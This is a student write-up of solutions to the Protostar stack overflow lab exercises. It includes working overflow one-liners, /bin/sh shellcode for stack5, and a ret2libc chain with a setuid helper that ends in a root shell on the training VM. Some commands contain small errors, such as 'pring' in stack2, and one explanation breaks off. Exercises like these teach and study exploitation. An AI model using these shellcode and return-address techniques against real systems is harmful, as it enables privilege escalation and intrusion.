## Lab 8: buffer overflow and remote code execution

Solutions for protostar exercises.

### Stack 0

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

To modify the `modified` variable we need to insert 65 bytes to the input. As variables are stored near each other, that will overwrite the `modified` value.

```sh
python -c "print 'A' * 65" | /opt/protostar/bin/stack0
```

### Stack 1

To set the value to the correct value, we need to overflow the buffer at correct position with the correct value. In our case the result value should be
`0x61626364`. As the system is little endian, we will pass the value as `\x64\x63\x62\x61'. Solution:

```sh
python -c "print 'A' * 64 + '\x64\x63\x62\x61'" | xargs /opt/protostar/bin/stack1
```

### Stack 2

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

We can initialize the env variable with python as `GREENIE=\`python -c "..."\``
This will simplify the process of initializing it. The logic is same as before, set the variable to the 64 bytes and the needed value. Solution:

```sh
GREENIE=`python -c "pring 'A' * 64 + '\x0a\x0d\x0a\x0d'"` /opt/protostar/bin/stack2
```

### Stack 3

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

To call the function we need the `fp` to point to the `win` function address. We can find the `win` address by running `gdb` and then `disass win` and 
looking on the address in the debugger. To overwrite the address with you the same buffer principle: 64 bytes + function address. Solution:

```sh
python -c "print 'A' * 64 + '$\x84\x04\x08'" | /opt/protostar/bin/stack3
```

### Stack 4

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

To overwrite the `%eip` register, we can analyze the C calling convention. When the function is called, first the returned address is put on the stack,
then the `%ebp` register. Afterwards, possible exception frame handler (inserted by compiler), and then local variables. We want to start executing `win`
after finishing `gets`. We can override everything up until the return address from the function, and set it to address of `win`.

`lea 0x10(%esp), %eax`

puts the address `%esp + 10` to `%eax`, while the stack pointer is on distance `0x50` from the `%ebp`. To retrieve the address of return address, we need to substract

Proposed solution:

```sh
python -c "print 'A' * 76 + '\xf4\x83\x04\x08'" | /opt/protostar/bin/stack4
```

### Stack 5

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

The idea is to override the return address to point to the beggining of the shell code on the stack, which will then run the shell. But, we cannot make it directly as the offset
changes from time to time. We can point it to `call %eax` instruction instread, which will jump to the value of `%eax`, and star executing from there. Since, `%eax` is assigned in the
`lea    0x10(%esp),%eax` during execution, it will jump to the start of the buffer. The code for running shell (making calls to Linux API) will start.

After the `leave` instruction is called the stack is unwinded back to the previous level. Then, when call instruction runs, it makes pushes to the stack and at some point overrides the bottom
values of the buffer. This can be mitigated with 'add $0x10 %esp' to reduce the stack 16 bytes further to make sure that pushed don't reach the buffer.

```sh
python -c "print '\x83\xc4\x10\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A' * 18 + '\xbf\x83\x04\x08'" | /opt/protostar/bin/stack5
```


### Stack 6

In this exercise we have a check that prevents direct overwrite to our code. But, we can override the addresses to use `system()` function to perform a call that will overwrite file permissions for our script that will start the shell
as root. The `system()` function expects first the address of the function, the return address, the parameter of the function. We can use the system variable to point to a script which will override  permissions. The script will reset
the permissions to allow the suid permission, namely the `user` will become `root`. When the script will run afterwards, it will run the shell as root. We can find the address of env variable by using get env.

To retrieve the `system()` address we can use `print system` in gdb.

Shell script:

```c
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp) {
  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/bin/bash");
}
```

```sh
user@protostar:~$ python -c "print 'A' * 80 + '\xb0\xff\xec\xb7' + '\xc0\x60\xec\xb7' + '\x16\xff\xff\xbf'" | /opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`
user@protostar:~$ ./shell
root@protostar:~# whoami
root
```

